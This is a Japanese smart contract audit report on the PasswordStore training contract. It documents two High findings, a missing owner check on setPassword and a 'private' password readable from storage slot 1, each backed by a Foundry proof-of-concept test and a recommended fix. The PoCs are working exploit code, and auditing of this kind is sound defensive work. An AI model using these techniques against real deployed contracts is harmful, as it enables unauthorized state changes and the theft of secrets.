# PasswordStore — 監査レポート（First Flight 提出用）

- **対象コントラクト:** `src/PasswordStore.sol`
- **コンパイラ:** Solidity `0.8.18`
- **監査フレームワーク:** Foundry（PoC テスト付き）
- **検出ツール / 手法:** 手動レビュー + Foundry による PoC

---

## サマリー

| ID | タイトル | 深刻度 |
|----|---------|--------|
| [H-1](#h-1-setpassword-にアクセス制御がなく誰でもパスワードを変更できる) | `setPassword` にアクセス制御がなく、誰でもパスワードを変更できる | **High** |
| [H-2](#h-2-private-変数-s_password-はオンチェーンから読み取れ秘密にならない) | `private` 変数 `s_password` はオンチェーンから読み取れ、秘密にならない | **High** |

| 深刻度 | 件数 |
|--------|------|
| High | 2 |
| Medium | 0 |
| Low | 0 |
| **合計** | **2** |

---

## H-1: `setPassword` にアクセス制御がなく、誰でもパスワードを変更できる

### 深刻度
**High**（Impact: High / Likelihood: High）

### 該当箇所
[`src/PasswordStore.sol:41-44`](src/PasswordStore.sol#L41-L44)

```solidity
function setPassword(string memory newPassword) external {
    s_password = newPassword;
    emit SetNetPassword();
}
```

### 概要
`PasswordStore` は「オーナーだけがパスワードを設定できる」ことを意図している（NatSpec の `@notice This function allows only the owner to set a new password.` がそれを示す）。しかし `setPassword` には `msg.sender` がオーナーであるかを確認する処理が一切なく、`external` で誰でも呼び出せる。結果として、任意の第三者がオーナーのパスワードを上書きできる。

### 影響（Impact）
- コントラクトの中心的なアクセス制御の前提が崩壊する。
- 攻撃者が任意のタイミングでオーナーのパスワードを書き換え、本来の所有者の意図しない値に置き換えられる。
- 保存データの完全性（integrity）が一切保証されない。

### 概念実証（PoC）
以下のテストは `test/PasswordStore.t.sol` に含まれており、**PASS する＝バグが存在する**ことを意味する。

```solidity
function test_anyone_can_set_password() public {
    // オーナーではない第三者になりすます
    address randomAttacker = address(1);
    vm.startPrank(randomAttacker);

    // 攻撃者が勝手にパスワードを設定
    string memory attackerPassword = "hackedByAttacker";
    passwordStore.setPassword(attackerPassword);
    vm.stopPrank();

    // 本物のオーナーが読むと、攻撃者の値に書き換わっている
    vm.startPrank(owner);
    string memory actualPassword = passwordStore.getPassword();
    assertEq(actualPassword, attackerPassword); // 通る＝バグの証明
    vm.stopPrank();
}
```

実行結果:

```
[PASS] test_anyone_can_set_password() (gas: 25440)
```

### 推奨される修正
`setPassword` に「呼び出し元がオーナーであること」のチェックを追加する。

```solidity
function setPassword(string memory newPassword) external {
    if (msg.sender != s_owner) {
        revert PasswordStore__NotOwner();
    }
    s_password = newPassword;
    emit SetNetPassword();
}
```

---

## H-2: `private` 変数 `s_password` はオンチェーンから読み取れ、秘密にならない

### 深刻度
**High**（Impact: High / Likelihood: High）

### 該当箇所
[`src/PasswordStore.sol:20`](src/PasswordStore.sol#L20)

```solidity
string private s_password;
```

### 概要
コントラクトは「他人に見えないパスワードを保存できる」と謳っている（`@notice This contract allows you to store a private password that others won't be able to see.`）。しかし Solidity の `private` は **他コントラクト / 他関数からの参照を禁止するだけ**であり、データそのものを暗号化・秘匿するものではない。ブロックチェーン上の全ストレージは誰でも読み取れるため、`s_password` の内容は外部から平文で取得できる。

`s_password` は宣言順で 2 番目の状態変数のため、ストレージ **スロット 1**（`s_owner` がスロット 0）に格納されている。`eth_getStorageAt`（Foundry では `vm.load`）で直接読み出せる。

### 影響（Impact）
- 「秘密のパスワード」というコントラクトの唯一の目的が達成されない。
- オーナー以外の任意の観察者が、保存されたパスワードを平文で取得できる。

### 概念実証（PoC）
```solidity
function test_password_is_not_really_private() public {
    // オーナーがパスワードを保存
    vm.startPrank(owner);
    string memory secret = "myTopSecret";
    passwordStore.setPassword(secret);
    vm.stopPrank();

    // s_password はスロット 1 に格納されている
    bytes32 data = vm.load(address(passwordStore), bytes32(uint256(1)));

    // 短い文字列は「文字データ + 末尾に (長さ*2)」で格納される
    uint256 length = (uint256(data) & 0xff) / 2;
    bytes memory passwordBytes = new bytes(length);
    for (uint256 i = 0; i < length; i++) {
        passwordBytes[i] = data[i];
    }
    string memory leaked = string(passwordBytes);
    console.log("Leaked password:", leaked);

    // private なのに中身が読めてしまう
    assertEq(leaked, secret);
}
```

実行結果:

```
[PASS] test_password_is_not_really_private() (gas: 27960)
Logs:
  Leaked password: myTopSecret
```

ログに平文 `myTopSecret` が出力されており、`private` 指定にもかかわらずパスワードが漏洩していることが確認できる。

### 推奨される修正
オンチェーンに秘密情報を平文で保存しない、という設計レベルの見直しが必要。

- 機密情報をオンチェーンに保存しない設計に変更する。
- どうしても保存が必要な場合は、オフチェーンで暗号化したうえで暗号文のみを保存し、復号鍵はオンチェーンに置かない。
- パスワードの管理自体をオンチェーンで行う前提（このコントラクトの目的）が根本的に成立しないことを設計者に伝える。

---

## 再現手順

```bash
forge test --match-test "test_anyone_can_set_password|test_password_is_not_really_private" -vv
```

期待される出力:

```
[PASS] test_anyone_can_set_password()
[PASS] test_password_is_not_really_private()
  Leaked password: myTopSecret
```

両テストが PASS することで、本レポートの 2 件の High 指摘がいずれも実証される。
